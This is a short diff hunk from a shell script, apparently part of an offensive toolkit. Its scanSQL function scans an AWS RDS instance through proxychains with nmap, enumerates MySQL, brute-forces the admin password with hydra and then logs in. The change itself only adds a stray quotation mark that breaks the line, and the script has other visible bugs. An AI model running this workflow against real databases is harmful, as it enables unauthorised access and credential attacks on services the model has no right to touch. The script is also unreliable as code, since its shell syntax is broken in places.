@@ -226,7 +226,7 @@ function getCurrentEssid() { sudo iwgetid  }
 
 function scanSQL {
 	sudo proxychains nmap -sS -v -Pn <<RDS Instance>> && tree -L -2 ./ && pwd && echo "Enter path for passwords list \n"; read passwordList
-	echo "[!] Enter an active RDS port from scan \n"; read scannedRDS
+	echo "[!] Enter an active RDS port from scan \n"; read scannedRDS"
 	sudo nmap -sS -A -vv -Pn -sV -p $(scannedRDS) --script=mysql-info, mysql-enum <<RDS Instance>>
 	hydra -l admin -P $passwordList <RDS IP Address> mysql
 	mysql -h <<RDS Instance name >> -p 3306 -u admin -p
